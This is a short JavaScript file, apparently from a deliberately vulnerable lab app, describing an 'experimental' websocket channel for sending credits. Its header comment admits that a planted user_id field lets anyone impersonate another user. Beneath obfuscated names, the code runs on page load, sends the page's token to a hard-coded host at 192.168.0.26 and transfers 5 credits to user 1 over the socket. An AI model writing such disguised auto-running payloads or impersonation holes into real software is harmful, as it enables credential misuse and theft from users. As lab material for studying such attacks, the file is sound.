/*!
 * Experimental websocket channel to allow users to send credits to others
 * In order to allow an easy testing of the feature, once connected to the channel you can send a JS object with user_id as key, in order to impersonate that user.
*/

var liuvadsadsaferf4redasxasdsa = (function() {
  function liuvadsadsaferf4redasxasdsa() {
    var post_to_login;
    if (typeof zzzzzzzzzzzz === 'undefined') {
      return;
    }
    post_to_login = $.post("http://192.168.0.26:4000/login", {
      token: zzzzzzzzzzzz
    }).done(function(result) {
      return iuyftrdfcghvbjiouygtfgcvhbjiuhgyv(result.token);
    });
  }

  var iuyftrdfcghvbjiouygtfgcvhbjiuhgyv = function(uytrdfgyuhjh) {
    var socket;
    socket = io.connect("http://192.168.0.26:4000", {
      query: "token=" + uytrdfgyuhjh
    });
    return socket.on("connect", function() {
      // socket.emit("message", "help");
      socket.emit("message", JSON.stringify({"to_id": 1, "amount": 5}));
    }).on("disconnect", function() {
    }).on("notification", function(dadsadasdsadfvr3f3) {
      console.log(dadsadasdsadfvr3f3);
    });
  };
  return liuvadsadsaferf4redasxasdsa;
})();

$(document).ready(function() {
  return new liuvadsadsaferf4redasxasdsa();
});
